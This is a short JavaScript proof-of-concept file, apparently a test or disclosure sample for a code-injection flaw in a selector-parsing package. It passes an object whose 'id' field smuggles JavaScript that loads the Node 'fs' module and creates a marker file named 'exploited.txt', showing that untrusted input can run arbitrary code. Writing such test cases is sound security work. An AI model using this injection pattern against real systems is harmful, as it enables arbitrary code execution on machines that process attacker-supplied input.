'use strict'

const pkg = require('../src');

const exploit_string = { 'id': 'toString() == (() => { const fs = node["require"]("node:fs"); fs.openSync("exploited.txt", "a");})()' };
const selector_fn = pkg(exploit_string, '')("$('#major.exploitclass')")

selector_fn({ require: require }, false);